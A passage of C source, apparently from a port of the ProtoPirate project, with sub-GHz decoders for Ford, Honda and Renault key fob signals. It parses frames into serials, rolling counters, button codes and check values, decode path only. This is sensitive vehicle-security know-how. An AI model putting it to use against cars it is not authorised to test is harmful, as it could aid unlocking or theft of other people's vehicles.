        memcpy(instance->raw_bytes, saved, sizeof(saved));
        instance->raw_bytes[16] = (uint8_t)(((uint8_t)partial << shift) | variant);

        if(ford_v1_process_data(instance)) {
            ford_v1_reset(instance);
            return true;
        }
    }

    ford_v1_reset(instance);
    return false;
}

static void* ford_v1_alloc() {
    PpDec_ford_v1* i = (PpDec_ford_v1*)calloc(1, sizeof(PpDec_ford_v1));
    if(!i) return NULL;
    i->generic.protocol_name = "Ford V1";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void ford_v1_reset(void* context) {
    PpDec_ford_v1* instance = (PpDec_ford_v1*)context;

    instance->decoder.parser_step = FordV1DecoderStepReset;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->byte_count = 0;
    memset(instance->raw_bytes, 0, sizeof(instance->raw_bytes));
    instance->preamble_count = 0;
    instance->sync_event_idx = 0;
    instance->sync_event_count = 0;
    memset(instance->sync_events, 0, sizeof(instance->sync_events));

    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
}

static void ford_v1_feed(void* context, bool level, uint32_t duration) {
    PpDec_ford_v1* instance = (PpDec_ford_v1*)context;

    uint32_t te_short = ford_v1_const.te_short;
    uint32_t te_long = ford_v1_const.te_long;

    switch(instance->decoder.parser_step) {
    case FordV1DecoderStepReset:
        if(!level && (DURATION_DIFF(duration, te_long) < FORD_V1_DELTA_LONG)) {
            instance->decoder.parser_step = FordV1DecoderStepPreamble;
            instance->preamble_count = 1;
            instance->decoder.te_last = duration;
        }
        break;

    case FordV1DecoderStepPreamble:
        if(DURATION_DIFF(duration, te_long) < FORD_V1_DELTA_LONG) {
            instance->preamble_count++;
            instance->decoder.te_last = duration;
        } else if(DURATION_DIFF(duration, te_short) < FORD_V1_DELTA_DATASYNC) {
            if(instance->preamble_count >= FORD_V1_PREAMBLE_MIN) {
                instance->sync_event_idx = 0;
                instance->sync_event_count = 1;
                instance->sync_events[0] =
                    (uint8_t)(level ? ManchesterEventShortHigh : ManchesterEventShortLow);
                instance->decoder.parser_step = FordV1DecoderStepSync;
            } else {
                instance->decoder.parser_step = FordV1DecoderStepReset;
            }
        } else {
            if(instance->preamble_count < FORD_V1_PREAMBLE_MIN) {
                instance->decoder.parser_step = FordV1DecoderStepReset;
            }
        }
        break;

    case FordV1DecoderStepSync: {
        uint8_t ev;
        bool is_short = false;

        if(DURATION_DIFF(duration, te_short) < FORD_V1_DELTA_DATASYNC) {
            ev = (uint8_t)(level ? ManchesterEventShortHigh : ManchesterEventShortLow);
            is_short = true;
        } else if(DURATION_DIFF(duration, te_long) < FORD_V1_DELTA_DATASYNC) {
            ev = (uint8_t)(level ? ManchesterEventLongHigh : ManchesterEventLongLow);
        } else {
            instance->decoder.parser_step = FordV1DecoderStepPreamble;
            break;
        }

        instance->sync_event_idx++;
        if(is_short) instance->sync_event_count++;

        if(instance->sync_event_idx < 8) {
            instance->sync_events[instance->sync_event_idx] = ev;
        }

        if(instance->sync_event_count > 2) {
            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            instance->byte_count = 0;
            memset(instance->raw_bytes, 0, sizeof(instance->raw_bytes));
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);

            if(instance->sync_events[0] == (uint8_t)ManchesterEventShortLow) {
                instance->manchester_state = ManchesterStateMid0;
            }

            instance->decoder.parser_step = FordV1DecoderStepData;

            for(uint8_t i = 0; i <= instance->sync_event_idx && i < 8; i++) {
                bool data_bit;
                if(manchester_advance(
                       instance->manchester_state,
                       (ManchesterEvent)instance->sync_events[i],
                       &instance->manchester_state,
                       &data_bit)) {
                    instance->decoder.decode_data = (instance->decoder.decode_data << 1) |
                                                    (data_bit ? 1 : 0);
                    instance->decoder.decode_count_bit++;

                    if((instance->decoder.decode_count_bit & 7) == 0) {
                        uint8_t byte_val = (uint8_t)(instance->decoder.decode_data & 0xFF);
                        if(instance->byte_count < FORD_V1_DATA_BYTES) {
                            instance->raw_bytes[instance->byte_count] = byte_val;
                            instance->byte_count++;
                        }
                        instance->decoder.decode_data = 0;
                    }
                }
            }
            break;
        }

        if(instance->sync_event_idx >= 7) {
            instance->decoder.parser_step = FordV1DecoderStepPreamble;
        }
        break;
    }

    case FordV1DecoderStepData: {
        ManchesterEvent event;

        if(DURATION_DIFF(duration, te_short) < FORD_V1_DELTA_DATASYNC) {
            event = level ? ManchesterEventShortHigh : ManchesterEventShortLow;
        } else if(DURATION_DIFF(duration, te_long) < FORD_V1_DELTA_DATASYNC) {
            event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        } else {
            (void)ford_v1_try_last_byte_variants(instance);
            break;
        }

        bool data_bit;
        if(manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
            instance->decoder.decode_data = (instance->decoder.decode_data << 1) |
                                            (data_bit ? 1 : 0);
            instance->decoder.decode_count_bit++;

            if((instance->decoder.decode_count_bit & 7) == 0) {
                uint8_t byte_val = (uint8_t)(instance->decoder.decode_data & 0xFF);
                if(instance->byte_count < FORD_V1_DATA_BYTES) {
                    instance->raw_bytes[instance->byte_count] = byte_val;
                    instance->byte_count++;
                }
                instance->decoder.decode_data = 0;

                if(instance->byte_count > 16) {
                    ford_v1_process_data(instance);
                    ford_v1_reset(instance);
                }
            }
        }

        instance->decoder.te_last = duration;
        break;
    }
    }
}

// =============================================================================
// Ford V3 — ProtoPirate (GPLv3)
// =============================================================================

#define FORD_V3_TE_SHORT      240U
#define FORD_V3_TE_LONG       480U
#define FORD_V3_TE_DELTA      60U
#define FORD_V3_CELL_TE_DELTA 120U
#define FORD_V3_DATA_BITS     104U
#define FORD_V3_DATA_BYTES    13U
#define FORD_V3_PREAMBLE_MIN  30U
#define FORD_V3_CELL_CAP      320U
#define FORD_V3_CELL_MIN      200U
#define FORD_V3_CELL_MIN_BITS 100U

#define FORD_V3_BTN_LOCK   0x01U
#define FORD_V3_BTN_UNLOCK 0x02U

#define FORD_V3_VARIANT_EU 0U
#define FORD_V3_VARIANT_US 1U

static const SubGhzBlockConst ford_v3_const = {
    .te_short = FORD_V3_TE_SHORT,
    .te_long = FORD_V3_TE_LONG,
    .te_delta = FORD_V3_TE_DELTA,
    .min_count_bit_for_found = FORD_V3_DATA_BITS,
};

static const SubGhzBlockConst ford_v3_cell_const = {
    .te_short = FORD_V3_TE_SHORT,
    .te_long = FORD_V3_TE_LONG,
    .te_delta = FORD_V3_CELL_TE_DELTA,
    .min_count_bit_for_found = FORD_V3_DATA_BITS,
};

typedef enum {
    FordV3DecoderStepReset = 0,
    FordV3DecoderStepPreamble = 1,
    FordV3DecoderStepData = 2,
} FordV3DecoderStep;

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;
    uint8_t manchester_raw[FORD_V3_DATA_BYTES];
    uint8_t manchester_bit_count;
    uint16_t preamble_count;

    uint8_t cells[FORD_V3_CELL_CAP];
    uint16_t cell_count;

    uint8_t raw_bytes[FORD_V3_DATA_BYTES];
    uint8_t last_raw_bytes[FORD_V3_DATA_BYTES];
    bool last_raw_valid;

    uint8_t variant;
    uint8_t flag;
    uint32_t serial;
    uint16_t counter;
} PpDec_ford_v3;

static bool ford_v3_cell_frame_valid(const uint8_t* raw) {
    if(raw[0] != 0xFFU) {
        return false;
    }

    const uint32_t serial = ((uint32_t)raw[1] << 24) | ((uint32_t)raw[2] << 16) |
                            ((uint32_t)raw[3] << 8) | (uint32_t)raw[4];
    if(serial == 0U || serial == 0xFFFFFFFFU) {
        return false;
    }

    if(raw[6] != FORD_V3_BTN_LOCK && raw[6] != FORD_V3_BTN_UNLOCK) {
        return false;
    }

    if((raw[5] & 0x80U) == 0U) {
        return false;
    }

    return true;
}

static void ford_v3_reset_manchester(PpDec_ford_v3* instance) {
    memset(instance->manchester_raw, 0, sizeof(instance->manchester_raw));
    instance->manchester_bit_count = 0;
    instance->preamble_count = 0;
    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
}

static void ford_v3_reset_cells(PpDec_ford_v3* instance) {
    instance->cell_count = 0;
}

static void ford_v3_add_manchester_bit(PpDec_ford_v3* instance, bool bit) {
    if(instance->manchester_bit_count >= FORD_V3_DATA_BITS) {
        return;
    }

    const uint8_t byte_index = instance->manchester_bit_count / 8U;
    const uint8_t bit_in_byte = 7U - (instance->manchester_bit_count % 8U);
    if(bit) {
        instance->manchester_raw[byte_index] |= (uint8_t)(1U << bit_in_byte);
    }
    instance->manchester_bit_count++;
}

static void ford_v3_parse_fields(PpDec_ford_v3* instance) {
    const uint8_t* b = instance->raw_bytes;

    instance->serial = ((uint32_t)b[1] << 24) | ((uint32_t)b[2] << 16) | ((uint32_t)b[3] << 8) |
                       (uint32_t)b[4];
    instance->generic.serial = instance->serial;

    if(instance->variant == FORD_V3_VARIANT_US) {
        instance->flag = b[5];
        instance->counter = (uint16_t)(((uint16_t)b[7] << 8) | (uint16_t)b[8]);
        instance->generic.btn = b[6];
    } else {
        instance->flag = 0;
        instance->counter = (uint16_t)((((uint16_t)(uint8_t)~b[7]) << 8) | (uint8_t)~b[8]);
        instance->generic.btn = (b[6] & 0x01U) ? FORD_V3_BTN_UNLOCK : FORD_V3_BTN_LOCK;
    }

    instance->generic.cnt = instance->counter;
}

static bool ford_v3_commit_frame(
    PpDec_ford_v3* instance,
    const uint8_t* raw,
    uint8_t variant) {
    if(instance->last_raw_valid &&
       memcmp(instance->last_raw_bytes, raw, FORD_V3_DATA_BYTES) == 0) {
        return true;
    }

    memcpy(instance->raw_bytes, raw, FORD_V3_DATA_BYTES);
    memcpy(instance->last_raw_bytes, raw, FORD_V3_DATA_BYTES);
    instance->last_raw_valid = true;

    instance->variant = variant;
    instance->generic.data_count_bit = FORD_V3_DATA_BITS;
    ford_v3_parse_fields(instance);

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }

    return true;
}

static void ford_v3_manchester_emit_if_ready(PpDec_ford_v3* instance) {
    if(instance->manchester_bit_count < FORD_V3_DATA_BITS) {
        return;
    }

    (void)ford_v3_commit_frame(instance, instance->manchester_raw, FORD_V3_VARIANT_EU);
}

static bool ford_v3_cell_decode(const uint8_t* cells, uint16_t cell_count, uint8_t* raw_out) {
    for(int phase = 0; phase < 2; phase++) {
        uint8_t frame[FORD_V3_DATA_BYTES];
        memset(frame, 0, sizeof(frame));

        int bit_count = 0;
        bool ok = true;
        for(int i = phase; (i + 1) < (int)cell_count && bit_count < (int)FORD_V3_DATA_BITS;
            i += 2) {
            const uint8_t first = cells[i];
            const uint8_t second = cells[i + 1];
            if(first == second) {
                ok = false;
                break;
            }
            if(first) {
                frame[bit_count >> 3] |= (uint8_t)(1U << (7 - (bit_count & 7)));
            }
            bit_count++;
        }

        if(!ok || bit_count < (int)FORD_V3_CELL_MIN_BITS) {
            continue;
        }
        if(!ford_v3_cell_frame_valid(frame)) {
            continue;
        }

        memcpy(raw_out, frame, FORD_V3_DATA_BYTES);
        return true;
    }

    return false;
}

static void ford_v3_cell_process(PpDec_ford_v3* instance) {
    if(instance->cell_count < FORD_V3_CELL_MIN) {
        return;
    }

    uint8_t raw[FORD_V3_DATA_BYTES];
    if(!ford_v3_cell_decode(instance->cells, instance->cell_count, raw)) {
        return;
    }

    (void)ford_v3_commit_frame(instance, raw, FORD_V3_VARIANT_US);
}

static void
    ford_v3_cell_feed(PpDec_ford_v3* instance, bool level, uint32_t duration) {
    if(pp_is_short(duration, &ford_v3_cell_const)) {
        if(instance->cell_count < FORD_V3_CELL_CAP) {
            instance->cells[instance->cell_count++] = level ? 1U : 0U;
        }
    } else if(pp_is_long(duration, &ford_v3_cell_const)) {
        if(instance->cell_count + 2U <= FORD_V3_CELL_CAP) {
            instance->cells[instance->cell_count++] = level ? 1U : 0U;
            instance->cells[instance->cell_count++] = level ? 1U : 0U;
        }
    } else {
        ford_v3_cell_process(instance);
        instance->cell_count = 0;
    }
}

static void
    ford_v3_manchester_feed(PpDec_ford_v3* instance, bool level, uint32_t duration) {
    switch(instance->decoder.parser_step) {
    case FordV3DecoderStepReset:
        if(pp_is_short(duration, &ford_v3_const)) {
            ford_v3_reset_manchester(instance);
            instance->preamble_count = 1U;
            instance->decoder.parser_step = FordV3DecoderStepPreamble;
        }
        break;

    case FordV3DecoderStepPreamble:
        if(pp_is_short(duration, &ford_v3_const)) {
            instance->preamble_count++;
        } else if(
            instance->preamble_count >= FORD_V3_PREAMBLE_MIN &&
            pp_is_long(duration, &ford_v3_const)) {
            instance->manchester_state = ManchesterStateMid1;

            const ManchesterEvent event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;

            bool data_bit = false;
            const bool valid = manchester_advance(
                instance->manchester_state, event, &instance->manchester_state, &data_bit);
            if(valid) {
                ford_v3_add_manchester_bit(instance, data_bit);
            }
            instance->decoder.parser_step = FordV3DecoderStepData;
        } else {
            instance->decoder.parser_step = FordV3DecoderStepReset;
        }
        break;

    case FordV3DecoderStepData:
        if(!pp_is_short(duration, &ford_v3_const) &&
           !pp_is_long(duration, &ford_v3_const)) {
            ford_v3_manchester_emit_if_ready(instance);
            instance->decoder.parser_step = FordV3DecoderStepReset;

            if(pp_is_short(duration, &ford_v3_const)) {
                ford_v3_reset_manchester(instance);
                instance->preamble_count = 1U;
                instance->decoder.parser_step = FordV3DecoderStepPreamble;
            }
            break;
        }

        ManchesterEvent event;
        if(level) {
            event = pp_is_short(duration, &ford_v3_const) ?
                        ManchesterEventShortHigh :
                        ManchesterEventLongHigh;
        } else {
            event = pp_is_short(duration, &ford_v3_const) ?
                        ManchesterEventShortLow :
                        ManchesterEventLongLow;
        }

        bool data_bit = false;
        const bool valid = manchester_advance(
            instance->manchester_state, event, &instance->manchester_state, &data_bit);

        if(valid) {
            ford_v3_add_manchester_bit(instance, data_bit);
            if(instance->manchester_bit_count >= FORD_V3_DATA_BITS) {
                ford_v3_manchester_emit_if_ready(instance);
                instance->decoder.parser_step = FordV3DecoderStepReset;
            }
        }
        break;
    }
}

static void* ford_v3_alloc() {
    PpDec_ford_v3* i = (PpDec_ford_v3*)calloc(1, sizeof(PpDec_ford_v3));
    if(!i) return NULL;
    i->generic.protocol_name = "Ford V3";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void ford_v3_reset(void* context) {
    PpDec_ford_v3* instance = (PpDec_ford_v3*)context;
    instance->decoder.parser_step = FordV3DecoderStepReset;
    ford_v3_reset_manchester(instance);
    ford_v3_reset_cells(instance);
    instance->last_raw_valid = false;
}

static void ford_v3_feed(void* context, bool level, uint32_t duration) {
    PpDec_ford_v3* instance = (PpDec_ford_v3*)context;
    ford_v3_cell_feed(instance, level, duration);
    ford_v3_manchester_feed(instance, level, duration);
}

// =============================================================================
// Honda V2 — ProtoPirate (GPLv3)
// =============================================================================

#define HONDA_V2_MIN_PREAMBLE_PAIRS 64U
#define HONDA_V2_SYNC_US            750U
#define HONDA_V2_SYNC_DELTA_US      120U

#define HONDA_V2_BTN_UNKNOWN 0x00U
#define HONDA_V2_BTN_LOCK    0x02U
#define HONDA_V2_BTN_UNLOCK  0x04U

#define HONDA_V2_SIG_UNLOCK 0xA285E3UL
#define HONDA_V2_SIG_LOCK   0xC20363UL

static const SubGhzBlockConst honda_v2_const = {
    .te_short = 250,
    .te_long = 500,
    .te_delta = 100,
    .min_count_bit_for_found = 81,
};

typedef enum {
    HondaV2DecoderStepReset = 0,
    HondaV2DecoderStepPreambleLow,
    HondaV2DecoderStepPreambleHigh,
    HondaV2DecoderStepSyncLow,
    HondaV2DecoderStepData,
} HondaV2DecoderStep;

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint16_t preamble_count;
    uint8_t raw[10];
    uint8_t bit_count;
    bool extra_bit;
    bool previous_bit;
    bool boundary_pad_skipped;
    bool pending_short;

    uint64_t key;
    uint16_t tail;
    uint32_t command_signature;
    uint32_t serial;
    uint32_t count;
    uint8_t button;
    uint8_t check;
    bool check_ok;
    bool tail_ok;
} PpDec_honda_v2;

static bool honda_v2_is_short(uint32_t duration) {
    return pp_is_short(duration, &honda_v2_const);
}

static bool honda_v2_is_long(uint32_t duration) {
    return pp_is_long(duration, &honda_v2_const);
}

static bool honda_v2_is_sync(uint32_t duration) {
    return DURATION_DIFF(duration, HONDA_V2_SYNC_US) < HONDA_V2_SYNC_DELTA_US;
}

static uint8_t honda_v2_button_from_signature(uint32_t signature) {
    if(signature == HONDA_V2_SIG_UNLOCK) {
        return HONDA_V2_BTN_UNLOCK;
    } else if(signature == HONDA_V2_SIG_LOCK) {
        return HONDA_V2_BTN_LOCK;
    }
    return HONDA_V2_BTN_UNKNOWN;
}

static uint8_t honda_v2_calculate_check(uint32_t count) {
    const uint8_t c0 = ((count >> 1) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 6)) &
                       1U;
    const uint8_t c1 = ((count >> 0) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^
                        (count >> 6) ^ 1U) &
                       1U;
    const uint8_t c2 = ((count >> 1) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^ (count >> 6)) &
                       1U;

    return (uint8_t)(c0 | (c1 << 1) | (c2 << 2));
}

static bool honda_v2_calculate_tail_msb(uint32_t count) {
    const uint8_t tail = ((count >> 0) ^ (count >> 2) ^ (count >> 4) ^ (count >> 5)) & 1U;
    return tail != 0U;
}

static uint16_t honda_v2_calculate_tail(uint32_t count) {
    return honda_v2_calculate_tail_msb(count) ? 0xFFFFU : 0x7FFFU;
}

static void honda_v2_parse_key_fields(
    uint64_t key,
    uint32_t* signature,
    uint32_t* serial,
    uint32_t* count,
    uint8_t* button,
    uint8_t* check) {
    uint8_t key_bytes[8];
    pp_u64_to_bytes_be(key, key_bytes);

    const uint32_t sig = ((uint32_t)key_bytes[0] << 16) | ((uint32_t)key_bytes[1] << 8) |
                         key_bytes[2];
    const uint32_t sn = ((uint32_t)key_bytes[3] << 16) | ((uint32_t)key_bytes[4] << 8) |
                        key_bytes[5];
    const uint32_t cnt = ((uint32_t)key_bytes[6] << 1) | ((key_bytes[7] >> 7) & 1U);

    if(signature) *signature = sig;
    if(serial) *serial = sn;
    if(count) *count = cnt;
    if(button) *button = honda_v2_button_from_signature(sig);
    if(check) *check = key_bytes[7] & 0x07U;
}

static bool honda_v2_validate_frame(
    uint64_t key,
    uint16_t tail,
    bool extra_bit,
    bool* check_ok,
    bool* tail_ok) {
    uint8_t key_bytes[8];
    pp_u64_to_bytes_be(key, key_bytes);

    const uint32_t count = ((uint32_t)key_bytes[6] << 1) | ((key_bytes[7] >> 7) & 1U);
    const uint8_t expected_check = honda_v2_calculate_check(count);
    const uint16_t expected_tail = honda_v2_calculate_tail(count);

    const bool local_check_ok = ((key_bytes[7] & 0x78U) == 0U) &&
                                ((key_bytes[7] & 0x07U) == expected_check);
    const bool local_tail_ok = (tail == expected_tail) && extra_bit;

    if(check_ok) *check_ok = local_check_ok;
    if(tail_ok) *tail_ok = local_tail_ok;

    return local_check_ok && local_tail_ok;
}

static bool honda_v2_add_decoded_bit(PpDec_honda_v2* instance, bool bit) {
    if(instance->bit_count < 80U) {
        const uint8_t byte_index = instance->bit_count / 8U;
        const uint8_t bit_index = 7U - (instance->bit_count % 8U);
        if(bit) {
            instance->raw[byte_index] |= (uint8_t)(1U << bit_index);
        }
    } else if(instance->bit_count == 80U) {
        instance->extra_bit = bit;
    } else {
        return false;
    }

    instance->bit_count++;
    return true;
}

static bool honda_v2_finish_frame(PpDec_honda_v2* instance) {
    const uint64_t key = pp_bytes_to_u64_be(instance->raw);
    const uint16_t tail = ((uint16_t)instance->raw[8] << 8) | instance->raw[9];

    if(!honda_v2_validate_frame(
           key, tail, instance->extra_bit, &instance->check_ok, &instance->tail_ok)) {
        return false;
    }

    instance->key = key;
    instance->tail = tail;

    honda_v2_parse_key_fields(
        key,
        &instance->command_signature,
        &instance->serial,
        &instance->count,
        &instance->button,
        &instance->check);

    instance->generic.data = instance->key;
    instance->generic.data_count_bit = honda_v2_const.min_count_bit_for_found;
    instance->generic.serial = instance->serial;
    instance->generic.btn = instance->button;
    instance->generic.cnt = instance->count;

    return true;
}

static bool honda_v2_process_transition(
    PpDec_honda_v2* instance,
    bool level,
    uint32_t duration) {
    if(!instance->boundary_pad_skipped) {
        if(level && honda_v2_is_short(duration)) {
            instance->boundary_pad_skipped = true;
            return true;
        }
        instance->boundary_pad_skipped = true;
    }

    if(instance->pending_short) {
        if(!instance->previous_bit && !level && honda_v2_is_short(duration)) {
            instance->pending_short = false;
            return honda_v2_add_decoded_bit(instance, false);
        } else if(instance->previous_bit && level && honda_v2_is_short(duration)) {
            instance->pending_short = false;
            return honda_v2_add_decoded_bit(instance, true);
        }
        return false;
    }

    if(!instance->previous_bit) {
        if(level && honda_v2_is_long(duration)) {
            instance->previous_bit = true;
            return honda_v2_add_decoded_bit(instance, true);
        } else if(level && honda_v2_is_short(duration)) {
            instance->pending_short = true;
            return true;
        }
        return false;
    }

    if(!level && honda_v2_is_long(duration)) {
        instance->previous_bit = false;
        return honda_v2_add_decoded_bit(instance, false);
    } else if(!level && honda_v2_is_short(duration)) {
        instance->pending_short = true;
        return true;
    }

    return false;
}

static void* honda_v2_alloc() {
    PpDec_honda_v2* i = (PpDec_honda_v2*)calloc(1, sizeof(PpDec_honda_v2));
    if(!i) return NULL;
    i->generic.protocol_name = "Honda V2";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void honda_v2_reset(void* context) {
    PpDec_honda_v2* instance = (PpDec_honda_v2*)context;

    instance->decoder.parser_step = HondaV2DecoderStepReset;
    instance->decoder.te_last = 0;
    instance->preamble_count = 0;
    memset(instance->raw, 0, sizeof(instance->raw));
    instance->bit_count = 0;
    instance->extra_bit = false;
    instance->previous_bit = true;
    instance->boundary_pad_skipped = false;
    instance->pending_short = false;
}

static void honda_v2_feed(void* context, bool level, uint32_t duration) {
    PpDec_honda_v2* instance = (PpDec_honda_v2*)context;

    switch(instance->decoder.parser_step) {
    case HondaV2DecoderStepReset:
        if(level && honda_v2_is_short(duration)) {
            instance->preamble_count = 0;
            instance->decoder.parser_step = HondaV2DecoderStepPreambleLow;
        }
        break;

    case HondaV2DecoderStepPreambleLow:
        if(!level && honda_v2_is_short(duration)) {
            instance->preamble_count++;
            instance->decoder.parser_step = HondaV2DecoderStepPreambleHigh;
        } else {
            instance->decoder.parser_step = HondaV2DecoderStepReset;
        }
        break;

    case HondaV2DecoderStepPreambleHigh:
        if(level && honda_v2_is_short(duration)) {
            instance->decoder.parser_step = HondaV2DecoderStepPreambleLow;
        } else if(
            level && honda_v2_is_sync(duration) &&
            instance->preamble_count >= HONDA_V2_MIN_PREAMBLE_PAIRS) {
            instance->decoder.parser_step = HondaV2DecoderStepSyncLow;
        } else {
            instance->decoder.parser_step = HondaV2DecoderStepReset;
        }
        break;

    case HondaV2DecoderStepSyncLow:
        if(!level && honda_v2_is_sync(duration)) {
            memset(instance->raw, 0, sizeof(instance->raw));
            instance->bit_count = 0;
            instance->extra_bit = false;
            instance->previous_bit = true;
            instance->boundary_pad_skipped = false;
            instance->pending_short = false;
            honda_v2_add_decoded_bit(instance, true);
            instance->decoder.parser_step = HondaV2DecoderStepData;
        } else {
            instance->decoder.parser_step = HondaV2DecoderStepReset;
        }
        break;

    case HondaV2DecoderStepData:
        if(!honda_v2_process_transition(instance, level, duration)) {
            instance->decoder.parser_step = HondaV2DecoderStepReset;
            break;
        }

        if(instance->bit_count == honda_v2_const.min_count_bit_for_found) {
            if(honda_v2_finish_frame(instance) && instance->base.callback) {
                instance->base.callback(&instance->base, instance->base.context);
            }
            instance->decoder.parser_step = HondaV2DecoderStepReset;
        }
        break;
    }

    instance->decoder.te_last = duration;
}

/* =============================================================================
 * REGISTRY
 * -----------------------------------------------------------------------------
 *   { "Ford V0",      ford_v0_alloc,      ford_v0_feed,      ford_v0_reset,      nullptr },
 *   { "Ford V1",      ford_v1_alloc,      ford_v1_feed,      ford_v1_reset,      nullptr },
 *   { "Ford V2",      ford_v2_alloc,      ford_v2_feed,      ford_v2_reset,      nullptr },
 *   { "Ford V3",      ford_v3_alloc,      ford_v3_feed,      ford_v3_reset,      nullptr },
 *   { "Honda V1",     honda_v1_alloc,     honda_v1_feed,     honda_v1_reset,     nullptr },
 *   { "Honda V2",     honda_v2_alloc,     honda_v2_feed,     honda_v2_reset,     nullptr },
 *   { "Honda Static", honda_static_alloc, honda_static_feed, honda_static_reset, nullptr },
 *
 * =============================================================================
 * UNRESOLVED REPORT
 * -----------------------------------------------------------------------------
 *   none — all 7 decoders emitted and resolve purely against the shim.
 *
 *   Note: ford_v1_process_data routes the ford_v1_fields_from_plain uint32_t*
 *   cnt out-parameter through a temporary, because the shim's
 *   SubGhzBlockGeneric.cnt is uint16_t (avoids a pointer-type mismatch).
 * ============================================================================= */


// ===== fragment: pp_frag_renfiat.h =====
// pp_frag_renfiat.h
// Self-contained decoder fragment for Renault/Fiat sub-GHz protocols.
// Ported (DECODE path only) from ProtoPirate (GPLv3).
// Relies on the pre-existing compatibility shim for all SubGhz* types,
// Manchester helpers, furi macros, and pp_cb. No #include, no #pragma once.

// ============================================================================
//  Renault V0  --  ProtoPirate (GPLv3)
// ============================================================================

// (1) block const (timings mirrored from the source #defines; feed uses raw
//     #defines directly, this is provided for template completeness)
static const SubGhzBlockConst renault_v0_const = {
    .te_short = 125,
    .te_long = 250,
    .te_delta = 69,
    .min_count_bit_for_found = 82,
};

// (2) timing / field #defines used by the feed path (uniquely prefixed already)
#define RENAULT_V0_MIN_BITS          0x52U
#define RENAULT_V0_DECODER_BIT_LIMIT 0x6DU
#define RENAULT_V0_SYNC_MIN_US       0x320U
#define RENAULT_V0_DECODED_BITS_MAX  0x70U
#define RENAULT_V0_TE_SHORT_US       0x7DU
#define RENAULT_V0_TE_LONG_US        0xFAU
#define RENAULT_V0_TE_DELTA_US       0x45U

// (4) decoder step enum
typedef enum {
    RenaultV0DecoderStepReset = 0,
    RenaultV0DecoderStepData = 1,
} RenaultV0DecoderStep;

// static tables used by the feed path
typedef struct {
    uint32_t low;
    uint32_t high;
} RenaultV0MatrixRow;

static const RenaultV0MatrixRow renault_v0_matrix[42] = {
    {0x00000001, 0x00000000}, {0x04000029, 0x00000000}, {0x0000001B, 0x00000000},
    {0x00000000, 0x00000000}, {0x00000001, 0x00000000}, {0x05220124, 0x00000000},
    {0x00000001, 0x00000000}, {0x00088410, 0x00000000}, {0x60132D1D, 0x00000000},
    {0x60170F87, 0x00001004}, {0x00000000, 0x00000000}, {0x002000A9, 0x00000000},
    {0x20863E01, 0x0000100C}, {0x24BB3755, 0x00000004}, {0x640199A4, 0x00000004},
    {0x24225C43, 0x00001004}, {0x607886F1, 0x0000100C}, {0x6007A101, 0x0000000C},
    {0x66672A10, 0x00000004}, {0x4651623F, 0x00001008}, {0x43380BBF, 0x00001008},
    {0x20237F84, 0x00001000}, {0x4245755E, 0x00001008}, {0x60AAF581, 0x00000004},
    {0x22722DAD, 0x0000000C}, {0x27C617F7, 0x00000000}, {0x46DE8F1B, 0x0000000C},
    {0x231DEC51, 0x00000000}, {0x03ACAA0B, 0x00000008}, {0x22D2BF81, 0x00000004},
    {0x626EF6AE, 0x0000100C}, {0x40441F95, 0x0000000C}, {0x00000001, 0x00000000},
    {0x00000000, 0x00000000}, {0x20B9A590, 0x00000008}, {0x656C8E86, 0x00001008},
    {0x60129F96, 0x0000000C}, {0x2368F667, 0x00001000}, {0x442A1A5C, 0x00000000},
    {0x04C43242, 0x0000100C}, {0x22198640, 0x00001000}, {0x23D6B958, 0x00001008},
};

static const uint8_t renault_v0_decoder_state_table[4] = {0x01, 0x91, 0x9B, 0xFB};

// (3) decoder instance
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint16_t packet_bit_count;
    uint8_t check_c1;
    uint8_t check_c2;
    uint8_t check_ic;
    uint32_t key2;
    uint8_t manchester_state;
    uint8_t decoded_bits[RENAULT_V0_DECODED_BITS_MAX];
    uint8_t decoded_bit_count;
} PpDec_renault_v0;

// (5) static helpers reached by the feed path
static void renault_v0_u64_to_bytes_be(uint64_t data, uint8_t bytes[8]) {
    for(size_t j = 0; j < 8; j++) {
        bytes[j] = (uint8_t)((data >> ((7U - j) * 8U)) & 0xFFU);
    }
}

static void
    renault_v0_parse_fields(uint64_t data, uint32_t* serial, uint8_t* button, uint8_t* counter) {
    if(serial) {
        *serial = (uint32_t)(data >> 40U);
    }
    if(button) {
        *button = (uint8_t)(data >> 32U);
    }
    if(counter) {
        *counter = (uint8_t)(((uint32_t)data >> 24U) & 0xFFU);
    }
}

static bool renault_v0_button_valid(uint8_t button) {
    return (button == 0x05U) || (button == 0x06U) || (button == 0x0AU);
}

static uint8_t renault_v0_checksum(uint64_t data, uint32_t key2) {
    uint8_t bytes[10];
    renault_v0_u64_to_bytes_be(data, bytes);
    bytes[8] = (uint8_t)((key2 >> 10U) & 0xFFU);
    bytes[9] = (uint8_t)((key2 >> 2U) & 0xFFU);

    uint8_t checksum = 0U;
    for(size_t i = 0; i < COUNT_OF(bytes); i++) {
        checksum ^= bytes[i];
    }
    return checksum;
}

static void renault_v0_set_split_bit(uint32_t* low, uint32_t* high, uint8_t bit) {
    if(bit < 32U) {
        *low |= (1UL << bit);
    } else {
        *high |= (1UL << (bit - 32U));
    }
}

static uint8_t renault_v0_parity32(uint32_t value) {
    value ^= value >> 16U;
